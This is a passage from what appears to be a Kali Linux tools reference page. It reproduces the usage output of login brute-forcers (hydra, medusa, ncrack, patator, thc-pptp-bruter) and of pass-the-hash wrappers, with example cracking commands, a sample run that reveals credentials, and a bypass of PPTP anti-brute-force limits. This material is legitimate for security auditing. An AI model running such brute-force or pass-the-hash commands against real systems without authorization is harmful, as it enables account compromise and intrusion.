    Oracle, Oracle-Listener, Oracle-SID, PC-Anywhere, PCNFS, POP3, POSTGRES,
    RDP, REXEC, RLOGIN, RSH, SAP/R3, SIP, SMB, SMTP, SMTP-Enum, SNMP,
    SOCKS5, SSH(v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet,
    VMware-Auth, VNC and XMPP.
    For most protocols, SSL mode is available (e.g. https-get, ftp-ssl, etc.)
</code></pre>

<p>``` plain
Hydra v8.1 &copy; 2014 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvVd46] [service://server[:PORT][/OPT]]</p>

<p>Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated &ldquo;login:pass&rdquo; format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, &lsquo;:&rsquo; to specify port
  -t TASKS  run TASKS number of connects in parallel (per host, default: 16)
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)</p>

<p>Supported services: asterisk cisco cisco-enable cvs firebird ftp ftps http[s]&ndash;{head|get} http[s]&ndash;{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[&ndash;{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp</p>

<p>Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at <a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>
Don&rsquo;t use in military or secret service organizations, or for illegal purposes.</p>

<p>Example:  hydra -l user -P passlist.txt <a href="ftp://192.168.0.1">ftp://192.168.0.1</a>
```</p>

<p><strong>hydra-gtk</strong></p>

<p>Hydra GUI</p>

<p><img class="center" src="/images/kali/password/xhydra.png" title="&lsquo;hydra gui&rsquo; &lsquo;xhydra&rsquo;" ></p>

<p><strong>keimpx</strong></p>

<p>keimpx is an open source tool, released under a modified version of Apache License 1.1.</p>

<p>It can be used to quickly check for valid credentials across a network over SMB. Credentials can be:</p>

<ul>
<li><p>Combination of user / plain-text password.</p></li>
<li><p>Combination of user / NTLM hash.</p></li>
<li><p>Combination of user / NTLM logon session token.</p></li>
</ul>


<p>If any valid credentials has been discovered across the network after its attack phase, the user is asked to choose which host to connect to and which valid credentials to use, then he will be prompted with an interactive SMB shell where the user can:</p>

<ul>
<li><p>Spawn an interactive command prompt.</p></li>
<li><p>Navigate through the remote SMB shares: list, upload, download files, create, remove files, etc.</p></li>
<li><p>Deploy and undeploy his own service, for instance, a backdoor listening on a TCP port for incoming connections.</p></li>
<li><p>List users details, domains and password policy.</p></li>
</ul>


<p>``` plain
keimpx 0.3-dev</p>

<pre><code>by Bernardo Damele A. G. &lt;bernardo.damele@gmail.com&gt;
</code></pre>

<p>Usage: keimpx.py [options]</p>

<p>Options:
  &mdash;version       show program&rsquo;s version number and exit
  -h, &mdash;help      show this help message and exit
  -v VERBOSE      Verbosity level: 0-2 (default: 0)
  -t TARGET       Target address
  -l LIST         File with list of targets
  -U USER         User
  -P PASSWORD     Password
  &mdash;nt=NTHASH     NT hash
  &mdash;lm=LMHASH     LM hash
  -c CREDSFILE    File with list of credentials
  -D DOMAIN       Domain
  -d DOMAINSFILE  File with list of domains
  -p PORT         SMB port: 139 or 445 (default: 445)
  -n NAME         Local hostname
  -T THREADS      Maximum simultaneous connections (default: 10)
  -b              Batch mode: do not ask to get an interactive SMB shell
  -x EXECUTELIST  Execute a list of commands against all hosts
```</p>

<p><strong>medusa</strong></p>

<p>Medusa  is  intended to be a speedy, massively parallel, modular, login brute-forcer.  The goal is to support as many services which allow
remote authentication as possible. The author considers following items to some of the key features of this application:</p>

<ul>
<li><p>Thread-based parallel testing. Brute-force testing can be performed against multiple hosts, users or passwords concurrently.</p></li>
<li><p>Flexible user input. Target information (host/user/password) can be specified in a variety of ways. For example, each item can be  either
a single entry or a file containing multiple entries. Additionally, a combination file format allows the user to refine their target listing.</p></li>
<li><p>Modular design. Each service module exists as an independent .mod file. This means that no modifications are necessary to the core application in order to extend the supported list of services for brute-forcing.</p></li>
</ul>


<p>``` plain
Medusa v2.0 [<a href="http://www.foofus.net">http://www.foofus.net</a>] &copy; JoMo-Kun / Foofus Networks <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#106;&#x6d;&#107;&#x40;&#102;&#x6f;&#x6f;&#102;&#117;&#115;&#46;&#110;&#101;&#x74;">&#106;&#109;&#x6b;&#x40;&#x66;&#x6f;&#111;&#102;&#117;&#x73;&#x2e;&#x6e;&#x65;&#x74;</a></p>

<p>ALERT: Host information must be supplied.</p>

<p>Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a</p>

<pre><code>             different parameter each time and they will all be sent to the module (i.e.
             -m Param1 -m Param2, etc.)
</code></pre>

<p>  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process</p>

<pre><code>             the entire username before proceeding.
</code></pre>

<p>  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module&rsquo;s usage information
  -v [NUM]     : Verbose level [0 &ndash; 6 (more)]
  -w [NUM]     : Error debug level [0 &ndash; 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan
```</p>

<p><strong>ncrack</strong></p>

<p>Ncrack is an open source tool for network authentication cracking. It was designed for high-speed parallel cracking using a dynamic engine
that can adapt to different network situations. Ncrack can also be extensively fine-tuned for special cases, though the default parameters
are generic enough to cover almost every situation. It is built on a modular architecture that allows for easy extension to support additional protocols. Ncrack is designed for companies and security professionals to audit large networks for default or weak passwords in
a rapid and reliable way. It can also be used to conduct fairly sophisticated and intensive brute force attacks against individual
services.</p>

<p>The output from Ncrack is a list of found credentials, if any, for each of the targets specified. Ncrack can also print an interactive
status report of progress so far and possibly additional debugging information that can help track problems, if the user selected that
option.</p>

<p>A typical Ncrack scan is shown in Example 1. The only Ncrack arguments used in this example are the two target IP addresses along with the
the corresponding ports for each of them. The two example ports 21 and 22 are automatically resolved to the default services listening on
them: ftp and ssh.</p>

<p>``` plain
Example 1. A representative Ncrack scan</p>

<pre><code>       $ ncrack 10.0.0.130:21 192.168.1.2:22

       Starting Ncrack 0.01ALPHA ( http://ncrack.org ) at 2009-07-24 23:05 EEST

       Discovered credentials for ftp on 10.0.0.130 21/tcp:
       10.0.0.130 21/tcp ftp: admin hello1
       Discovered credentials for ssh on 192.168.1.2 22/tcp:
       192.168.1.2 22/tcp ssh: guest 12345
       192.168.1.2 22/tcp ssh: admin money$

       Ncrack done: 2 services scanned in 156.03 seconds.

       Ncrack finished.
</code></pre>

<p>```</p>

<p><strong>patator</strong></p>

<p>A multi-purpose brute-forcer, with a modular design and a flexible usage.</p>

<p>``` plain
Patator v0.5 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
Usage: patator.py module &mdash;help</p>

<p>Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (<a href="http://netwinsite.com/poppassd/">http://netwinsite.com/poppassd/</a>)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward lookup names
  + dns_reverse   : Reverse lookup subnets
  + snmp_login    : Brute-force SNMP v1/2/3
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module
```</p>

<p><strong>phrasendrescher</strong></p>

<p>phrasen|drescher (p|d) is a modular and multi processing pass phrase cracking tool. It comes with a number of plugins but a simple plugin API allows an easy development of new plugins. The main features of p|d are:</p>

<ul>
<li><p>Modular with the use of plugins</p></li>
<li><p>Multi processing</p></li>
<li><p>Dictionary attack with or without permutations (uppercase, lowercase, l33t, etc.)</p></li>
<li><p>Incremental brute force attack with custom character maps</p></li>
<li><p>Runs on FreeBSD, NetBSD, OpenBSD, MacOS and Linux</p></li>
</ul>


<p>``` plain
phrasen|drescher 1.2.2 &ndash; the passphrase cracker
Copyright &copy; 2008 Nico Leidecker; <a href="http://www.leidecker.info">http://www.leidecker.info</a></p>

<p>Usage: pd plugin [options]</p>

<p> Available plugins:
   enc-file  pkey  ssh  mssql  http-raw</p>

<p> General Options:
   h           : print this message
   v           : verbose mode
   i from[:to] : incremental mode beginning with word length `from'</p>

<pre><code>             and going to `to'
</code></pre>

<p>   d file      : run dictionary based with words from `file'
   w number    : number of worker threads (default is one)
   r rules     : specify rewriting rules for the dictionary mode:</p>

<pre><code>               A = all characters upper case
               F = first character upper case
               L = last character upper case
               W = first letter of each word to upper case
               a = all characters lower case
               f = first character lower case
               l = last character lower case
               w = first letter of each word to lower case
               D = prepend digit
               d = append digit
               e = 1337 characters
               x = all rules
</code></pre>

<p> Environment Variables:
   PD_PLUGINS : the directory containing plugins</p>

<pre><code>            (current is /usr/lib/phrasendrescher)
</code></pre>

<p>   PD_CHARMAP : the characters for the incremental mode are</p>

<pre><code>            taken from a character list. A customized list
            can be specified in the environment variable
</code></pre>

<p>```</p>

<p><strong>thc-pptp-bruter</strong></p>

<p>Brute force program against pptp vpn endpoints (tcp port 1723). Fully standalone. Supports latest MSChapV2 authentication. Tested against Windows and Cisco gateways. Exploits a weakness in Microsoft’s anti-brute force implementation which makes it possible to try 300 passwords the second.</p>

<p>``` plain
Target IP missing.
thc-pptp-bruter [options] <remote host IP>
  -v        Verbose output / Debug output
  -W        Disable windows hack [default: enabled]
  -u <user> User [default: administrator]
  -w <file> Wordlist file [default: stdin]
  -p <n>    PPTP port [default: 1723]
  -n <n>    Number of parallel tries [default: 5]
  -l <n>    Limit to n passwords / sec [default: 100]</p>

<p>Windows-Hack reuses the LCP connection with the same caller-id. This
gets around MS&rsquo;s anti-brute forcing protection. It&rsquo;s enabled by default.
```</p>

<h3>Passing the Hash</h3>

<p><strong>Pass the Hash Toolkit</strong></p>

<p>This is a collection of scripts for pass-the-hash scenarios</p>

<p><strong>pth-curl</strong></p>

<p>``` plain
root@kali:~# pth-curl &mdash;help
Usage: curl [options&hellip;] <url>
Options: (H) means HTTP/HTTPS only, (F) means FTP only</p>

<pre><code> --anyauth       Pick "any" authentication method (H)
</code></pre>

<p> -a, &mdash;append        Append to target file when uploading (F/SFTP)</p>

<pre><code> --basic         Use HTTP Basic Authentication (H)
 --cacert FILE   CA certificate to verify peer against (SSL)
 --capath DIR    CA directory to verify peer against (SSL)
</code></pre>

<p> -E, &mdash;cert CERT[:PASSWD] Client certificate file and password (SSL)</p>

<pre><code> --cert-type TYPE Certificate file type (DER/PEM/ENG) (SSL)
 --ciphers LIST  SSL ciphers to use (SSL)
 --compressed    Request compressed response (using deflate or gzip)
</code></pre>

<p> -K, &mdash;config FILE   Specify which config file to read</p>

<pre><code> --connect-timeout SECONDS  Maximum time allowed for connection
</code></pre>

<p> -C, &mdash;continue-at OFFSET  Resumed transfer offset
 -b, &mdash;cookie STRING/FILE  String or file to read cookies from (H)
 -c, &mdash;cookie-jar FILE  Write cookies to this file after operation (H)</p>

<pre><code> --create-dirs   Create necessary local directory hierarchy
 --crlf          Convert LF to CRLF in upload
 --crlfile FILE  Get a CRL list in PEM format from the given file
</code></pre>

<p> -d, &mdash;data DATA     HTTP POST data (H)</p>

<pre><code> --data-ascii DATA  HTTP POST ASCII data (H)
 --data-binary DATA  HTTP POST binary data (H)
 --data-urlencode DATA  HTTP POST data url encoded (H)
 --delegation STRING GSS-API delegation permission
 --digest        Use HTTP Digest Authentication (H)
 --disable-eprt  Inhibit using EPRT or LPRT (F)
 --disable-epsv  Inhibit using EPSV (F)
</code></pre>

<p> -D, &mdash;dump-header FILE  Write the headers to this file</p>

<pre><code> --egd-file FILE  EGD socket path for random data (SSL)
 --engine ENGINGE  Crypto engine (SSL). "--engine list" for list
</code></pre>

<p> -f, &mdash;fail          Fail silently (no output at all) on HTTP errors (H)
 -F, &mdash;form CONTENT  Specify HTTP multipart POST data (H)</p>

<pre><code> --form-string STRING  Specify HTTP multipart POST data (H)
 --ftp-account DATA  Account data string (F)
 --ftp-alternative-to-user COMMAND  String to replace "USER [name]" (F)
 --ftp-create-dirs  Create the remote dirs if not present (F)
 --ftp-method [MULTICWD/NOCWD/SINGLECWD] Control CWD usage (F)
 --ftp-pasv      Use PASV/EPSV instead of PORT (F)
</code></pre>

<p> -P, &mdash;ftp-port ADR  Use PORT with given address instead of PASV (F)</p>

<pre><code> --ftp-skip-pasv-ip Skip the IP address for PASV (F)
 --ftp-pret      Send PRET before PASV (for drftpd) (F)
 --ftp-ssl-ccc   Send CCC after authenticating (F)
 --ftp-ssl-ccc-mode ACTIVE/PASSIVE  Set CCC mode (F)
 --ftp-ssl-control Require SSL/TLS for ftp login, clear for transfer (F)
</code></pre>

<p> -G, &mdash;get           Send the -d data with a HTTP GET (H)
 -g, &mdash;globoff       Disable URL sequences and ranges using {} and []
 -H, &mdash;header LINE   Custom header to pass to server (H)
 -I, &mdash;head          Show document info only
 -h, &mdash;help          This help text</p>

<pre><code> --hostpubmd5 MD5  Hex encoded MD5 string of the host public key. (SSH)
</code></pre>

<p> -0, &mdash;http1.0       Use HTTP 1.0 (H)</p>

<pre><code> --ignore-content-length  Ignore the HTTP Content-Length header
</code></pre>

<p> -i, &mdash;include       Include protocol headers in the output (H/F)
 -k, &mdash;insecure      Allow connections to SSL sites without certs (H)</p>

<pre><code> --interface INTERFACE  Specify network interface/address to use
</code></pre>

<p> -4, &mdash;ipv4          Resolve name to IPv4 address
 -6, &mdash;ipv6          Resolve name to IPv6 address
 -j, &mdash;junk-session-cookies Ignore session cookies read from file (H)</p>

<pre><code> --keepalive-time SECONDS  Interval between keepalive probes
 --key KEY       Private key file name (SSL/SSH)
 --key-type TYPE Private key file type (DER/PEM/ENG) (SSL)
 --krb LEVEL     Enable Kerberos with specified security level (F)
 --libcurl FILE  Dump libcurl equivalent code of this command line
 --limit-rate RATE  Limit transfer speed to this rate
</code></pre>

<p> -l, &mdash;list-only     List only names of an FTP directory (F)</p>

<pre><code> --local-port RANGE  Force use of these local port numbers
</code></pre>

<p> -L, &mdash;location      Follow redirects (H)</p>

<pre><code> --location-trusted like --location and send auth to other hosts (H)
</code></pre>

<p> -M, &mdash;manual        Display the full manual</p>

<pre><code> --mail-from FROM  Mail from this address
 --mail-rcpt TO  Mail to this receiver(s)
 --mail-auth AUTH  Originator address of the original email
 --max-filesize BYTES  Maximum file size to download (H/F)
 --max-redirs NUM  Maximum number of redirects allowed (H)
</code></pre>

<p> -m, &mdash;max-time SECONDS  Maximum time allowed for the transfer</p>

<pre><code> --negotiate     Use HTTP Negotiate Authentication (H)
</code></pre>

<p> -n, &mdash;netrc         Must read .netrc for user name and password</p>

<pre><code> --netrc-optional Use either .netrc or URL; overrides -n
 --netrc-file FILE  Set up the netrc filename to use
</code></pre>

<p> -N, &mdash;no-buffer     Disable buffering of the output stream</p>

<pre><code> --no-keepalive  Disable keepalive use on the connection
 --no-sessionid  Disable SSL session-ID reusing (SSL)
 --noproxy       List of hosts which do not use proxy
 --ntlm          Use HTTP NTLM authentication (H)
</code></pre>

<p> -o, &mdash;output FILE   Write output to <file> instead of stdout</p>

<pre><code> --pass PASS     Pass phrase for the private key (SSL/SSH)
 --post301       Do not switch to GET after following a 301 redirect (H)
 --post302       Do not switch to GET after following a 302 redirect (H)
 --post303       Do not switch to GET after following a 303 redirect (H)
</code></pre>

<p> &ndash;#, &mdash;progress-bar  Display transfer progress as a progress bar</p>

<pre><code> --proto PROTOCOLS  Enable/disable specified protocols
 --proto-redir PROTOCOLS  Enable/disable specified protocols on redirect
</code></pre>

<p> -x, &mdash;proxy [PROTOCOL://]HOST[:PORT] Use proxy on given port</p>

<pre><code> --proxy-anyauth Pick "any" proxy authentication method (H)
 --proxy-basic   Use Basic authentication on the proxy (H)
 --proxy-digest  Use Digest authentication on the proxy (H)
 --proxy-negotiate Use Negotiate authentication on the proxy (H)
 --proxy-ntlm    Use NTLM authentication on the proxy (H)
</code></pre>

<p> -U, &mdash;proxy-user USER[:PASSWORD]  Proxy user and password</p>

<pre><code> --proxy1.0 HOST[:PORT]  Use HTTP/1.0 proxy on given port
</code></pre>

<p> -p, &mdash;proxytunnel   Operate through a HTTP proxy tunnel (using CONNECT)</p>

<pre><code> --pubkey KEY    Public key file name (SSH)
</code></pre>

<p> -Q, &mdash;quote CMD     Send command(s) to server before transfer (F/SFTP)</p>

<pre><code> --random-file FILE  File for reading random data from (SSL)
</code></pre>

<p> -r, &mdash;range RANGE   Retrieve only the bytes within a range</p>

<pre><code> --raw           Do HTTP "raw", without any transfer decoding (H)
</code></pre>

<p> -e, &mdash;referer       Referer URL (H)
 -J, &mdash;remote-header-name Use the header-provided filename (H)
 -O, &mdash;remote-name   Write output to a file named as the remote file</p>

<pre><code> --remote-name-all Use the remote file name for all URLs
</code></pre>

<p> -R, &mdash;remote-time   Set the remote file&rsquo;s time on the local output
 -X, &mdash;request COMMAND  Specify request command to use</p>

<pre><code> --resolve HOST:PORT:ADDRESS  Force resolve of HOST:PORT to ADDRESS
 --retry NUM   Retry request NUM times if transient problems occur
 --retry-delay SECONDS When retrying, wait this many seconds between each
 --retry-max-time SECONDS  Retry only within this period
</code></pre>

<p> -S, &mdash;show-error    Show error. With -s, make curl show errors when they occur
 -s, &mdash;silent        Silent mode. Don&rsquo;t output anything</p>

<pre><code> --socks4 HOST[:PORT]  SOCKS4 proxy on given host + port
 --socks4a HOST[:PORT]  SOCKS4a proxy on given host + port
 --socks5 HOST[:PORT]  SOCKS5 proxy on given host + port
 --socks5-hostname HOST[:PORT] SOCKS5 proxy, pass host name to proxy
 --socks5-gssapi-service NAME  SOCKS5 proxy service name for gssapi
 --socks5-gssapi-nec  Compatibility with NEC SOCKS5 server
</code></pre>

<p> -Y, &mdash;speed-limit RATE  Stop transfers below speed-limit for &lsquo;speed-time&rsquo; secs
 -y, &mdash;speed-time SECONDS  Time for trig speed-limit abort. Defaults to 30</p>

<pre><code> --ssl           Try SSL/TLS (FTP, IMAP, POP3, SMTP)
 --ssl-reqd      Require SSL/TLS (FTP, IMAP, POP3, SMTP)
</code></pre>

<p> -2, &mdash;sslv2         Use SSLv2 (SSL)
 -3, &mdash;sslv3         Use SSLv3 (SSL)</p>

<pre><code> --ssl-allow-beast Allow security flaw to improve interop (SSL)
 --stderr FILE   Where to redirect stderr. - means stdout
 --tcp-nodelay   Use the TCP_NODELAY option
</code></pre>

<p> -t, &mdash;telnet-option OPT=VAL  Set telnet option</p>

<pre><code> --tftp-blksize VALUE  Set TFTP BLKSIZE option (must be &gt;512)
</code></pre>

<p> -z, &mdash;time-cond TIME  Transfer based on a time condition
 -1, &mdash;tlsv1         Use TLSv1 (SSL)</p>

<pre><code> --trace FILE    Write a debug trace to the given file
 --trace-ascii FILE  Like --trace but without the hex output
 --trace-time    Add time stamps to trace/verbose output
 --tr-encoding   Request compressed transfer encoding (H)
</code></pre>

<p> -T, &mdash;upload-file FILE  Transfer FILE to destination</p>

<pre><code> --url URL       URL to work with
</code></pre>

<p> -B, &mdash;use-ascii     Use ASCII/text transfer
 -u, &mdash;user USER[:PASSWORD]  Server user and password</p>

<pre><code> --tlsuser USER  TLS username
 --tlspassword STRING TLS password
 --tlsauthtype STRING  TLS authentication type (default SRP)
</code></pre>

<p> -A, &mdash;user-agent STRING  User-Agent to send to server (H)
 -v, &mdash;verbose       Make the operation more talkative
 -V, &mdash;version       Show version number and quit
 -w, &mdash;write-out FORMAT  What to output after completion</p>

<pre><code> --xattr        Store metadata in extended file attributes
</code></pre>

<p> -q                 If used as the first parameter disables .curlrc
```</p>

<p><strong>pth-net</strong></p>

<p>``` plain
Usage:
net rpc             Run functions using RPC transport
net rap             Run functions using RAP transport
net ads             Run functions using ADS transport
net file            Functions on remote opened files
net share           Functions on shares
net session         Manage sessions
net server          List servers in workgroup
net domain          List domains/workgroups on network
net printq          Modify printer queue
net user            Manage users
net group           Manage groups
net groupmap        Manage group mappings
net sam             Functions on the SAM database
net validate        Validate username and password
net groupmember     Modify group memberships
net admin           Execute remote command on a remote OS/2 server
net service         List/modify running services
net password        Change user password on target server
net changetrustpw   Change the trust password
net changesecretpw  Change the secret password
net setauthuser     Set the winbind auth user
net getauthuser     Get the winbind auth user settings
net time            Show/set time
net lookup          Look up host names/IP addresses
net g_lock          Manipulate the global lock table
net join            Join a domain/AD
net dom             Join/unjoin (remote) machines to/from a domain/AD
net cache           Operate on the cache tdb file
net getlocalsid     Get the SID for the local domain
net setlocalsid     Set the SID for the local domain
net setdomainsid    Set domain SID on member servers
net getdomainsid    Get domain SID on member servers
net maxrid          Display the maximum RID currently used
net idmap           IDmap functions
net status          Display server status
net usershare       Manage user-modifiable shares
net usersidlist     Display list of all users with SID
net conf            Manage Samba registry based configuration
net registry        Manage the Samba registry
net eventlog        Process Win32 *.evt eventlog files
net printing        Process tdb printer files
net serverid        Manage the serverid tdb
net help            Print usage information
Valid targets: choose one (none defaults to localhost)</p>

<pre><code>-S or --server=&lt;server&gt;     server name
-I or --ipaddress=&lt;ipaddr&gt;  address of target server
-w or --workgroup=&lt;wg&gt;      target workgroup or domain
</code></pre>

<p>Valid miscellaneous options are:</p>

<pre><code>-p or --port=&lt;port&gt;     connection port on target
-W or --myworkgroup=&lt;wg&gt;    client workgroup
-d or --debuglevel=&lt;level&gt;  debug level (0-10)
-n or --myname=&lt;name&gt;       client name
-U or --user=&lt;name&gt;     user name
-s or --configfile=&lt;path&gt;   pathname of smb.conf file
-l or --long            Display full information
-V or --version         Print samba version information
-P or --machine-pass        Authenticate as machine account
-e or --encrypt         Encrypt SMB transport (UNIX extended servers only)
-k or --kerberos        Use kerberos (active directory) authentication
</code></pre>

<p>```</p>

<p><strong>pth-openchangeclient</strong></p>

<p>``` plain
Usage: openchangeclient [OPTION&hellip;]
  -f, &mdash;database=STRING           set the profile database path</p>

<pre><code>  --pf                        access public folders instead of mailbox
</code></pre>

<p>  -p, &mdash;profile=STRING            set the profile name
  -P, &mdash;password=STRING           set the profile password</p>

<pre><code>  --username=STRING           set the username of the mailbox to use
</code></pre>

<p>  -S, &mdash;sendmail                  send a mail</p>

<pre><code>  --sendappointment           send an appointment
  --sendcontact               send a contact
  --sendtask                  send a task
  --sendnote                  send a note
</code></pre>

<p>  -F, &mdash;fetchmail                 fetch user INBOX mails</p>

<pre><code>  --fetchsummary              fetch message summaries only
</code></pre>

<p>  -G, &mdash;storemail=STRING          retrieve a mail on the filesystem
  -i, &mdash;fetch-items=STRING        fetch specified user INBOX items</p>

<pre><code>  --freebusy=STRING           display free / busy information for the specified user
  --force                     force openchangeclient behavior in some circumstances
  --delete=STRING             delete a message given its unique ID
</code></pre>

<p>  -u, &mdash;update=STRING             update the specified item
  -m, &mdash;mailbox                   list mailbox folder summary
  -D, &mdash;deletemail                delete a mail from user INBOX
  -A, &mdash;attachments=STRING        send a list of attachments
  -I, &mdash;html-inline=STRING        send PR_HTML content
  -W, &mdash;html-file=STRING          use HTML file as content
  -t, &mdash;to=STRING                 set the To recipients
  -c, &mdash;cc=STRING                 set the Cc recipients
  -b, &mdash;bcc=STRING                set the Bcc recipients
  -s, &mdash;subject=STRING            set the mail subject
  -B, &mdash;body=STRING               set the mail body</p>

<pre><code>  --location=STRING           set the item location
  --label=STRING              set the event label
  --dtstart=STRING            set the event start date
  --dtend=STRING              set the event end date
  --busystatus=STRING         set the item busy status
  --taskstatus=STRING         set the task status
  --importance=STRING         Set the item importance
  --email=STRING              set the email address
  --fullname=STRING           set the full name
  --cardname=STRING           set a contact card name
  --color=STRING              set the note color
  --notifications             monitor INBOX newmail notifications
  --folder=STRING             set the folder to use instead of inbox
  --mkdir                     create a folder
  --rmdir                     delete a folder
  --userlist                  list Address Book entries
  --folder-name=STRING        set the folder name
  --folder-comment=STRING     set the folder comment
</code></pre>

<p>  -d, &mdash;debuglevel=STRING         set Debug Level</p>

<pre><code>  --dump-data                 dump the hex data
  --private                   set the private flag on messages
  --ocpf-file=STRING          set OCPF file
  --ocpf-dump=STRING          dump message into OCPF file
  --ocpf-syntax               check OCPF files syntax
  --ocpf-sender               send message using OCPF files contents
</code></pre>

<p>Help options:
  &ndash;?, &mdash;help                      Show this help message</p>

<pre><code>  --usage                     Display brief usage message
</code></pre>

<p>Common openchange options:
  -V, &mdash;version                   Print version
```</p>

<p><strong>pth-rpcclient</strong></p>

<p>``` plain
Usage: rpcclient [OPTION&hellip;]
  -c, &mdash;command=COMMANDS                 Execute semicolon separated cmds
  -I, &mdash;dest-ip=IP                       Specify destination IP address
  -p, &mdash;port=PORT                        Specify port number</p>

<p>Help options:
  &ndash;?, &mdash;help                             Show this help message</p>

<pre><code>  --usage                            Display brief usage message
</code></pre>

<p>Common samba options:
  -d, &mdash;debuglevel=DEBUGLEVEL            Set debug level
  -s, &mdash;configfile=CONFIGFILE            Use alternate configuration file
  -l, &mdash;log-basename=LOGFILEBASE         Base name for log files
  -V, &mdash;version                          Print version</p>

<pre><code>  --option=name=value                Set smb.conf option from command line
</code></pre>

<p>Connection options:
  -O, &mdash;socket-options=SOCKETOPTIONS     socket options to use
  -n, &mdash;netbiosname=NETBIOSNAME          Primary netbios name
  -W, &mdash;workgroup=WORKGROUP              Set the workgroup name
  -i, &mdash;scope=SCOPE                      Use this Netbios scope</p>

<p>Authentication options:
  -U, &mdash;user=USERNAME                    Set the network username
  -N, &mdash;no-pass                          Don&rsquo;t ask for a password
  -k, &mdash;kerberos                         Use kerberos (active directory)</p>

<pre><code>                                     authentication
</code></pre>

<p>  -A, &mdash;authentication-file=FILE         Get the credentials from a file
  -S, &mdash;signing=on|off|required          Set the client signing state
  -P, &mdash;machine-pass                     Use stored machine account password
  -e, &mdash;encrypt                          Encrypt SMB transport (UNIX extended</p>

<pre><code>                                     servers only)
</code></pre>

<p>  -C, &mdash;use-ccache                       Use the winbind ccache for</p>

<pre><code>                                     authentication
  --pw-nt-hash                       The supplied password is the NT hash
</code></pre>

<p>```</p>

<p><strong>pth-smbclient</strong></p>

<p>``` plain
Usage: smbclient [&ndash;?EgBVNkPeC] [&ndash;?|&mdash;help] [&mdash;usage]</p>

<pre><code>    [-R|--name-resolve=NAME-RESOLVE-ORDER] [-M|--message=HOST]
    [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST]
    [-m|--max-protocol=LEVEL] [-T|--tar=&lt;c|x&gt;IXFqgbNan]
    [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
    [-p|--port=PORT] [-g|--grepable] [-B|--browse]
    [-d|--debuglevel=DEBUGLEVEL] [-s|--configfile=CONFIGFILE]
    [-l|--log-basename=LOGFILEBASE] [-V|--version] [--option=name=value]
    [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME]
    [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME]
    [-N|--no-pass] [-k|--kerberos] [-A|--authentication-file=FILE]
    [-S|--signing=on|off|required] [-P|--machine-pass] [-e|--encrypt]
    [-C|--use-ccache] [--pw-nt-hash] service &lt;password&gt;
</code></pre>

<p>```</p>

<p><strong>pth-smbget</strong></p>

<p>``` plain
Usage: smbget [OPTION&hellip;]
  -a, &mdash;guest                 Work as user guest
  -e, &mdash;encrypt               Encrypt SMB transport (UNIX extended servers</p>

<pre><code>                          only)
</code></pre>

<p>  -r, &mdash;resume                Automatically resume aborted files
